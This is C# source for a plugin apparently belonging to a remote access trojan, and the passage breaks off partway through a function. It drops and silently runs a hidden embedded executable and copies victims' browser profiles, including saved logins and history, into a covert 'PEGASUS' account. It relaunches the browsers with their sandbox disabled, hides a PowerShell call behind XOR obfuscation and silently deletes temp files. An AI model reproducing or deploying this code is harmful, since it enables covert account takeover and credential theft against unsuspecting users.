using Plugin.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Plugin
{
    public  class HandleRDP
    {

        public HandleRDP()
        {
            //Task.Factory.StartNew(() => Copyall()).Wait();
            //Task.Factory.StartNew(() => syncAllFilesFirstTime()).Wait();
            //ewatch();
            string pegaDesktopName = @"C:\Users\PEGASUS";
            while (!Directory.Exists(pegaDesktopName))
            {

            }
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofrdp = Path.Combine(path, "PEGASUS");
            if (!Directory.Exists(pathofrdp))
            {
                Directory.CreateDirectory(pathofrdp);
            }
            string rdpinstallpath = Path.Combine(pathofrdp, "copypro.exe");
            Byte[] rdpinstallbytes = Resources.CopyProfileRDP;
            File.WriteAllBytes(rdpinstallpath, rdpinstallbytes);
            Task.Run(() => Process.Start(rdpinstallpath)).Wait();
            //Task.Factory.StartNew(() => Packet.Execute(rdpinstallbytes)).Wait();
            File.SetAttributes(rdpinstallpath, FileAttributes.Hidden);

        }
        static string strSourcePath = null;
        static string strDestPath = null;

        private static async Task Copyall()
        {
            string pegaDesktopName = @"C:\Users\PEGASUS";
            string PegaDeskPath = @"C:\Users\PEGASUS\Desktop";

            string user = Environment.UserName;
            string BraveLocalrdp = @"C:\Users\"+user+"\\AppData\\Local\\BraveSoftware";
            string MozillarLocaldp = @"C:\Users\" + user + "\\AppData\\Local\\Mozilla ";
            string MozillarRoamingdp = @"C:\Users\" + user + "\\AppData\\Roaming\\Mozilla";
            string OperaLocalrdp = @"C:\Users\" + user + "\\AppData\\Local\\Opera Software ";
            string OperaRoamingrdp = @"C:\Users\" + user + "\\AppData\\Roaming\\Opera Software";
            string EdgeLocalrdp = @"C:\Users\" + user + "\\AppData\\Local\\Microsoft\\Edge";
            string CurrentDeskPath= @"C:\Users\" + user + "\\Desktop";

            string pega = "PEGASUS";
            string pegaBraveLocalrdp = @"C:\Users\" + pega + "\\AppData\\Local\\BraveSoftware";
            string pegaMozillarLocaldp = @"C:\Users\" + pega + "\\AppData\\Local\\Mozilla ";
            string pegaMozillarRoamingdp = @"C:\Users\" + pega + "\\AppData\\Roaming\\Mozilla";
            string pegaOperaLocalrdp = @"C:\Users\" + pega + "\\AppData\\Local\\Opera Software ";
            string pegaOperaRoamingrdp = @"C:\Users\" + pega + "\\AppData\\Roaming\\Opera Software";
            string pegaEdgeLocalrdp = @"C:\Users\" + pega + "\\AppData\\Local\\Microsoft\\Edge";
            string pegaCurrentDeskPath = @"C:\Users\" + pega + "\\Desktop";
            if (!Directory.Exists(pegaDesktopName))
            {
                System.IO.Directory.CreateDirectory(pegaDesktopName);
            }
            if (Directory.Exists(BraveLocalrdp))
            {
                if (!Directory.Exists(pegaBraveLocalrdp))
                {
                    System.IO.Directory.CreateDirectory(pegaBraveLocalrdp);
                }
                //DirectoryCopy(BraveLocalrdp, pegaBraveLocalrdp);
                List<Thread> ThreadBrave = new List<Thread>();
                try
                {

                    ThreadBrave.Add(new Thread(() =>
                    {

                        try
                        {

                            CopyFolder(BraveLocalrdp, pegaBraveLocalrdp);

                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in ThreadBrave)
                        t.Start();
                    foreach (Thread t in ThreadBrave)
                        t.Join();

                }
                catch
                {

                }
            }
            if (Directory.Exists(MozillarLocaldp))
            {
                if (!Directory.Exists(pegaMozillarLocaldp))
                {
                    System.IO.Directory.CreateDirectory(pegaMozillarLocaldp);
                }
                DirectoryCopy(MozillarLocaldp, pegaMozillarLocaldp);

                if (!Directory.Exists(pegaMozillarRoamingdp))
                {
                    System.IO.Directory.CreateDirectory(pegaMozillarRoamingdp);
                }
                DirectoryCopy(MozillarRoamingdp, pegaMozillarRoamingdp);
                List<Thread> ThreadMozilla = new List<Thread>();
                try
                {

                    ThreadMozilla.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {

                            CopyFolder(MozillarLocaldp, pegaMozillarLocaldp);
                            CopyFolder(MozillarRoamingdp, pegaMozillarRoamingdp);

                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in ThreadMozilla)
                        t.Start();
                    foreach (Thread t in ThreadMozilla)
                        t.Join();

                }
                catch
                {

                }
            }
            if (Directory.Exists(OperaLocalrdp))
            {
                if (!Directory.Exists(pegaOperaLocalrdp))
                {
                    System.IO.Directory.CreateDirectory(pegaOperaLocalrdp);
                }
                DirectoryCopy(OperaLocalrdp, pegaOperaLocalrdp);

                if (!Directory.Exists(pegaOperaRoamingrdp))
                {
                    System.IO.Directory.CreateDirectory(pegaOperaRoamingrdp);
                }
                DirectoryCopy(OperaRoamingrdp, pegaOperaRoamingrdp);
                List<Thread> ThreadOpera = new List<Thread>();
                try
                {

                    ThreadOpera.Add(new Thread(() =>
                    {
                        try
                        {

                            CopyFolder(OperaLocalrdp, pegaOperaLocalrdp);
                            CopyFolder(OperaRoamingrdp, pegaOperaRoamingrdp);

                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in ThreadOpera)
                        t.Start();
                    foreach (Thread t in ThreadOpera)
                        t.Join();

                }
                catch
                {

                }
            }
            if (Directory.Exists(EdgeLocalrdp))
            {
                if (!Directory.Exists(pegaEdgeLocalrdp))
                {
                    System.IO.Directory.CreateDirectory(pegaEdgeLocalrdp);
                }
                DirectoryCopy(EdgeLocalrdp, pegaEdgeLocalrdp);
                List<Thread> ThreadEdge = new List<Thread>();
                try
                {

                    ThreadEdge.Add(new Thread(() =>
                    {

                        try
                        {
                            CopyFolder(EdgeLocalrdp, pegaEdgeLocalrdp);

                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in ThreadEdge)
                        t.Start();
                    foreach (Thread t in ThreadEdge)
                        t.Join();

                }
                catch
                {

                }
            }




















            string strDesktopName = "rdp_project";
            string path = @"C:\Users\PEGASUS\Desktop";
            string chrome = "C:\\Users\\PEGASUS\\Desktop\\Google Chrome.lnk";
            string Cchrome = Path.Combine(path, "*Chrome.lnk");
            string Uchrome = Path.Combine(path, "Google Chrome.lnk");
            string UEdge = Path.Combine(path, "Microsoft Edge.lnk");
            string Edge = "C:\\Users\\PEGASUS\\Desktop\\Microsoft Edge.lnk";
            string text6 = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command", null, null) as string;
            string btext3 = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\BraveHTML\shell\open\command", null, null) as string;
            string gtext3 = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command", null, null) as string;
            if (File.Exists(chrome))
            {
                File.Delete(chrome);

            }
            else if (File.Exists(Uchrome))
            {
                File.Delete(Uchrome);

            }
            else if (File.Exists(Cchrome))
            {
                DirectoryInfo di = new DirectoryInfo(path);
                FileInfo[] files = di.GetFiles("*Chrome.lnk")
                                     .Where(p => p.Extension == ".lnk").ToArray();
                foreach (FileInfo file in files)
                    try
                    {
                        file.Attributes = FileAttributes.Normal;
                        File.Delete(file.FullName);
                    }
                    catch { }

            }

            if (File.Exists(Edge))
            {
                File.Delete(Edge);

            }
            else if (File.Exists(UEdge))
            {
                File.Delete(UEdge);

            }
            else if (File.Exists(UEdge))
            {
                DirectoryInfo di = new DirectoryInfo(path);
                FileInfo[] files = di.GetFiles("*Edge.lnk")
                                     .Where(p => p.Extension == ".lnk").ToArray();
                foreach (FileInfo file in files)
                    try
                    {
                        file.Attributes = FileAttributes.Normal;
                        File.Delete(file.FullName);
                    }
                    catch { }

            }


            if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
            {
                string FfolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                FfolderPath = Path.Combine(FfolderPath, "Mozilla\\Firefox\\");
                string Fpath = Path.Combine(FfolderPath, "profiles.ini");
                string[] array = File.ReadAllLines(Fpath);
                bool flag = false;
                string Ftext = null;
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    if (text2.Contains("IsRelative=1"))
                    {
                        flag = true;
                    }
                    else if (text2.Contains("Path="))
                    {
                        Ftext = text2.Substring(5);
                    }
                }
                FfolderPath = ((!flag) ? Ftext : Path.Combine(FfolderPath, Ftext));
                string pegapath = @"C:\Users\PEGASUS\AppData\Roaming\";
                string text3 = Path.Combine(pegapath, "Mozilla\\Firefox\\rdp_project");
                if (!Directory.Exists(text3))
                {
                    Directory.CreateDirectory(text3);
                }

                //DirectoryCopy("\"" + FfolderPath + "\"", "\"" + text3 + "\"");
                //Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(FfolderPath, text3);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }
                strSourcePath = FfolderPath;
                strDestPath = text3;
                string firefox = @"C:\\Program Files\\Mozilla Firefox\\firefox.exe";
                string FArguments = "";
                FArguments += " -new-tab about:sessionrestore -no-remote -profile " + text3;
                createlinks(firefox, FArguments, "Firefox");
            }
            if (File.Exists("C:\\Program Files\\Waterfox\\waterfox.exe"))
            {
                string WfolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                WfolderPath = Path.Combine(WfolderPath, "Waterfox");
                string Wpath = Path.Combine(WfolderPath, "profiles.ini");
                string[] array = File.ReadAllLines(Wpath);
                bool flag = false;
                string Wtext = null;
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    if (text2.Contains("IsRelative=1"))
                    {
                        flag = true;
                    }
                    else if (text2.Contains("Path="))
                    {
                        Wtext = text2.Substring(5);
                    }
                }
                WfolderPath = ((!flag) ? Wtext : Path.Combine(WfolderPath, Wtext));
                string pegapath = @"C:\Users\PEGASUS\AppData\Roaming\";
                string text3 = Path.Combine(pegapath, "Waterfox\\rdp_project");
                if (!Directory.Exists(text3))
                {
                    Directory.CreateDirectory(text3);
                }
                //DirectoryCopy("\"" + WfolderPath + "\"", "\"" + text3 + "\"");
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(WfolderPath, text3);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }
                strSourcePath = WfolderPath;
                strDestPath = text3;
                string waterfox = @"C:\\Program Files\\Waterfox\\waterfox.exe";
                string wArguments = "";
                wArguments += " -new-tab about:sessionrestore -no-remote -profile " + text3;
                createlinks(waterfox, wArguments, "Waterfox");
            }
            if (File.Exists("C:\\Program Files\\Pale Moon\\palemoon.exe"))
            {
                string PfolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                PfolderPath = Path.Combine(PfolderPath, "Moonchild Productions\\Pale Moon");
                string Ppath = Path.Combine(PfolderPath, "profiles.ini");
                string[] array = File.ReadAllLines(Ppath);
                bool flag = false;
                string Ptext = null;
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    if (text2.Contains("IsRelative=1"))
                    {
                        flag = true;
                    }
                    else if (text2.Contains("Path="))
                    {
                        Ptext = text2.Substring(5);
                    }
                }
                PfolderPath = ((!flag) ? Ptext : Path.Combine(PfolderPath, Ptext));
                string pegapath = @"C:\Users\PEGASUS\AppData\Roaming\";
                string text3 = Path.Combine(pegapath, "Moonchild Productions\\Pale Moon\\rdp_project");
                if (!Directory.Exists(text3))
                {
                    Directory.CreateDirectory(text3);
                }
                //DirectoryCopy("\"" + PfolderPath + "\"", "\"" + text3 + "\"");
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(PfolderPath, text3);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }
                strSourcePath = PfolderPath;
                strDestPath = text3;
                string pale = @"C:\\Program Files\\Pale Moon\\palemoon.exe";
                string pArguments = "";
                pArguments += " -new-tab about:sessionrestore -no-remote -profile " + text3;
                createlinks(pale, pArguments, "Palemoon");
            }
            if (File.Exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
            {
                string strLocalAppPath = Environment.GetEnvironmentVariable("LocalAppData");
                strLocalAppPath = Path.Combine(strLocalAppPath, "Google\\Chrome");

                string strNewAppPath = @"C:\Users\PEGASUS\AppData\Local\Google\Chrome\";
                strNewAppPath = Path.Combine(strLocalAppPath, strDesktopName);
                strLocalAppPath = Path.Combine(strLocalAppPath, "User Data");

                Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(strLocalAppPath, strNewAppPath);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }

                string strCmdLine = "";
                var strChromePath = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command", null, null) as string;
                if (strChromePath != null)
                {
                    var split = strChromePath.Split('\"');
                    strChromePath = split.Length >= 2 ? split[1] : null;

                    strCmdLine += "\"" + strChromePath + "\"";
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                }
                else
                {
                    const string suffix = @"Google\Chrome\Application\chrome.exe";
                    var prefixes = new List<string> { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) };
                    var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    var programFilesx86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                    if (programFilesx86 != programFiles)
                    {
                        prefixes.Add(programFiles);
                    }
                    else
                    {
                        var programFilesDirFromReg = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion", "ProgramW6432Dir", null) as string;
                        if (programFilesDirFromReg != null) prefixes.Add(programFilesDirFromReg);
                    }

                    prefixes.Add(programFilesx86);
                    strChromePath = prefixes.Distinct().Select(prefix => Path.Combine(prefix, suffix)).FirstOrDefault(File.Exists);

                    strChromePath = "\"" + strChromePath + "\"";
                    strCmdLine += strChromePath;
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-extensions --disable-notifications --no-referrers --no-experiments --mute-audio --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --flag-switches-begin --flag-switches-end --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                    string strTestAppPath = Path.Combine(Path.GetTempPath(), "zedrat");
                    File.AppendAllText(strTestAppPath + "\\test2", strCmdLine);
                }

                strSourcePath = strLocalAppPath;
                strDestPath = strNewAppPath;

                watch();
                syncAllFilesFirstTime();
                string localAppDataPath = @"C:\Users\PEGASUS\AppData\Local";
                string chromeLocalAppDataPath = localAppDataPath + "\\Google\\Chrome\\rdp_project";
                string CArguments = "";
                CArguments += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                CArguments += "\"";
                CArguments += chromeLocalAppDataPath;
                CArguments += "\"";
                createlinks(strChromePath, CArguments, "Chrome");
            }
            if (File.Exists("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"))
            {
                string strLocalAppPath = Environment.GetEnvironmentVariable("LocalAppData");
                strLocalAppPath = Path.Combine(strLocalAppPath, "BraveSoftware\\Brave-Browser");

                string strNewAppPath = @"C:\Users\PEGASUS\AppData\Local\BraveSoftware\Brave-Browser\";
                strNewAppPath = Path.Combine(strLocalAppPath, strDesktopName);
                strLocalAppPath = Path.Combine(strLocalAppPath, "User Data");

                Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(strLocalAppPath, strNewAppPath);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }

                string strCmdLine = "";
                var strChromePath = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\BraveHTML\shell\open\command", null, null) as string;
                if (strChromePath != null)
                {
                    var split = strChromePath.Split('\"');
                    strChromePath = split.Length >= 2 ? split[1] : null;

                    strCmdLine += "\"" + strChromePath + "\"";
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                }
                else
                {
                    const string suffix = @"BraveSoftware\Brave-Browser\Application\brave.exe";
                    var prefixes = new List<string> { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) };
                    var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    var programFilesx86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                    if (programFilesx86 != programFiles)
                    {
                        prefixes.Add(programFiles);
                    }
                    else
                    {
                        var programFilesDirFromReg = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion", "ProgramW6432Dir", null) as string;
                        if (programFilesDirFromReg != null) prefixes.Add(programFilesDirFromReg);
                    }

                    prefixes.Add(programFilesx86);
                    strChromePath = prefixes.Distinct().Select(prefix => Path.Combine(prefix, suffix)).FirstOrDefault(File.Exists);

                    strChromePath = "\"" + strChromePath + "\"";
                    strCmdLine += strChromePath;
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-extensions --disable-notifications --no-referrers --no-experiments --mute-audio --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --flag-switches-begin --flag-switches-end --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                    string strTestAppPath = Path.Combine(Path.GetTempPath(), "zedrat");
                    File.AppendAllText(strTestAppPath + "\\test2", strCmdLine);
                }

                strSourcePath = strLocalAppPath;
                strDestPath = strNewAppPath;

                watch();
                syncAllFilesFirstTime();
                string localAppDataPath = @"C:\Users\PEGASUS\AppData\Local";
                string braveLocalAppDataPath = localAppDataPath + "\\BraveSoftware\\Brave-Browser\\rdp_project";
                string bArguments = "";
                bArguments += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                bArguments += "\"";
                bArguments += braveLocalAppDataPath;
                bArguments += "\"";
                createlinks(strChromePath, bArguments, "Brave");

            }
            if (File.Exists("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"))
            {
                string strLocalAppPath = Environment.GetEnvironmentVariable("LocalAppData");
                strLocalAppPath = Path.Combine(strLocalAppPath, "Microsoft\\Edge");

                string strNewAppPath = @"C:\Users\PEGASUS\AppData\Local\Microsoft\Edge\";
                strNewAppPath = Path.Combine(strLocalAppPath, strDesktopName);
                strLocalAppPath = Path.Combine(strLocalAppPath, "User Data");

                Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(strLocalAppPath, strNewAppPath);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }

                string strCmdLine = "";
                var strChromePath = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command", null, null) as string;
                if (strChromePath != null)
                {
                    var split = strChromePath.Split('\"');
                    strChromePath = split.Length >= 2 ? split[1] : null;

                    strCmdLine += "\"" + strChromePath + "\"";
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                }
                else
                {
                    const string suffix = @"Microsoft\Edge\Application\msedge.exe";
                    var prefixes = new List<string> { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) };
                    var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    var programFilesx86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                    if (programFilesx86 != programFiles)
                    {
                        prefixes.Add(programFiles);
                    }
                    else
                    {
                        var programFilesDirFromReg = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion", "ProgramW6432Dir", null) as string;
                        if (programFilesDirFromReg != null) prefixes.Add(programFilesDirFromReg);
                    }

                    prefixes.Add(programFilesx86);
                    strChromePath = prefixes.Distinct().Select(prefix => Path.Combine(prefix, suffix)).FirstOrDefault(File.Exists);

                    strChromePath = "\"" + strChromePath + "\"";
                    strCmdLine += strChromePath;
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-extensions --disable-notifications --no-referrers --no-experiments --mute-audio --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --flag-switches-begin --flag-switches-end --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                    string strTestAppPath = Path.Combine(Path.GetTempPath(), "zedrat");
                    File.AppendAllText(strTestAppPath + "\\test2", strCmdLine);
                }

                strSourcePath = strLocalAppPath;
                strDestPath = strNewAppPath;

                watch();
                syncAllFilesFirstTime();
                string localAppDataPath = @"C:\Users\PEGASUS\AppData\Local";
                string edgeLocalAppDataPath = localAppDataPath + "\\Microsoft\\Edge\\rdp_project";
                string eArguments = "";
                eArguments += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                eArguments += "\"";
                eArguments += edgeLocalAppDataPath;
                eArguments += "\"";
                createlinks(strChromePath, eArguments, "Edge");

            }

            SHChangeNotify(0x8000000, 0x1000, IntPtr.Zero, IntPtr.Zero);
            SHChangeNotify(0x8000000, 0x1000, IntPtr.Zero, IntPtr.Zero);
        }
        public static void createlinks(string browserpath, string Arguments, string browser)
        {
            string lnkFileName = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "" + browser + ".lnk");
            //string lnkFileName = System.IO.Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory), "" + browser + ".lnk");
            Shortcut1.Create(lnkFileName, browserpath, Arguments, null, "Open " + browser + "", "Ctrl+Shift+N", null);


        }

        [System.Runtime.InteropServices.DllImport("Shell32.dll")]
        private static extern int SHChangeNotify(int eventId, int flags, IntPtr item1, IntPtr item2);
        private static void DirectoryCopy(string srcDirName, string dstDirName)
        {
            Process process = new Process();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe");
            process.StartInfo.Arguments = srcDirName + " " + dstDirName + " /K /D /H /E /Y";
            process.StartInfo.RedirectStandardError = false;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.WaitForExit();
        }

        private static void ChromeFileCopy(string srcDirName, string dstDirName)
        {
            string[] files = Directory.GetFiles(srcDirName);
            string[] array = files;
            foreach (string text in array)
            {
                string text2 = dstDirName + "/" + Path.GetFileName(text);
                if (File.Exists(text) && !File.Exists(text2))
                {
                    File.Copy(text, text2);
                }
            }
            if (!Directory.Exists(dstDirName + "/Default"))
            {
                Directory.CreateDirectory(dstDirName + "/Default");
            }
            if (File.Exists(srcDirName + "/Default/Login Data") && !File.Exists(dstDirName + "/Default/Login Data"))
            {
                File.Copy(srcDirName + "/Default/Login Data", dstDirName + "/Default/Login Data", overwrite: true);
            }
            if (File.Exists(srcDirName + "/Default/History") && !File.Exists(dstDirName + "/Default/History"))
            {
                File.Copy(srcDirName + "/Default/History", dstDirName + "/Default/History", overwrite: true);
            }
        }
        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        public static void PS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        public static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = thebook("ze}oxyboff"),
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        public static string thebook(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }
            return stringBuilder.ToString();
        }
        public static void CopyFolder(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string name = System.IO.Path.GetFileName(file);
                string dest = System.IO.Path.Combine(destFolder, name);
                File.Copy(file, dest, true);
            }
            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                string name = System.IO.Path.GetFileName(folder);
                string dest = System.IO.Path.Combine(destFolder, name);
                CopyFolder(folder, dest);
            }
        }

        private static void syncAllFilesFirstTime()
        {
            string[] arrFiles = Directory.GetFiles(strSourcePath);

